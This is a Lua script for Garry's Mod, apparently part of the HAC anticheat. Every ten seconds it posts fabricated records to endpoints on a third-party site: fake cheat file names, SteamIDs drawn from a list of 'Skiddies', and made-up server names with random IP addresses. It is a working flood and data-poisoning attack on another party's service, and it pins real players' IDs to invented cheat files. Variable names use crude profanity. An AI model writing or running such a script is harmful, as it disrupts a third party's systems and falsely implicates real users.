

local Names = {
	"Epic",
	"Death",
	"Kill",
	"Melon",
	"Boner",
	"Trouser",
	"Big",
	"Ultimate",
	"Trouble",
	"Build",
	"365",
	"Addons",
	"No",
	"RDM",
	"DarkRP",
	"Stanley's",
}

local Tags = {
	"No Lag",
	"12yo Admin",
	"Inf. Cash",
	"SERIOUS",
	"RDM",
	"DONATE",
	"GUNZ",
}

local Skiddies = {}
for k,v in pairs(HAC.Skiddies) do table.insert(Skiddies, k) end

local Hacks = {
	"auto",
	"hera",
	"bot",
	"blue",
	"hack",
	"A",
	"speed",
}

function Bang()	

	local Bot = ""
	local Done = false
	for i=1,math.random(3,6) do
		if utilx.OneIn(5) then
			Bot = table.Random(Hacks)
			break
		end
		Bot = Bot..(Done and (utilx.OneIn(1) and "_" or "") or "" )..table.Random(Hacks)
		if not Done then Done = true end
	end
	
	local rs = Bot..(utilx.OneIn(5) and "" or "_v"..math.random(1,99))..".lua"
	local rn = Bot..(utilx.OneIn(5) and "" or "_v"..math.random(1,99))..".lua"
	
	local Fuck1 = {
		var = sql.SQLStr(rs, true)..":"..sql.SQLStr(rn, true),
		name = HAC.RandomString(),
		steamid = table.RandomEx(Skiddies)
	}
	http.Post("http://elitehero.freehostia.com/anticheat", Fuck1)
	HAC.file.Append("fuck1.txt", "\n"..table.ToString(Fuck1) )
	
	
	
	local Name = ""
	for i=1,math.random(3,6) do
		Name = Name.." "..table.Random(Names)
	end
	
	Name = (utilx.OneIn(1) and "["..table.Random(Tags).."]" or "")..Name
	Name = Name.." "..(utilx.OneIn(3) and "" or "["..(utilx.OneIn(1) and table.Random(Tags) or table.Random(Names)).."]")
	Name = Name:Trim()
	
	local Fuck2 = {
		s = Name,
		ip = math.random(1,244).."."..math.random(1,244).."."..math.random(1,244).."."..math.random(1,244),
		p = math.random(27015,27020),
	}
	http.Post("http://elitehero.freehostia.com/servers", Fuck2)
	HAC.file.Append("fuck2.txt", "\n"..table.ToString(Fuck2) )
	
	--[[
	local Fuck3 = {
		n = "why_you_ban_HeX_"..HAC.RandomString()..".lua",
		s = "--"..HAC.RandomString(32).." It isn't very nice :(",
	}
	http.Post("http://elitehero.freehostia.com/dl.php", Fuck3)
	HAC.file.Append("fuck3.txt", "\n"..table.ToString(Fuck3) )
	]]
end

timer.Create("LOL", 10, 0, Bang)

concommand.Add("bang", function()
	print("! one bang")
	Bang()
end)
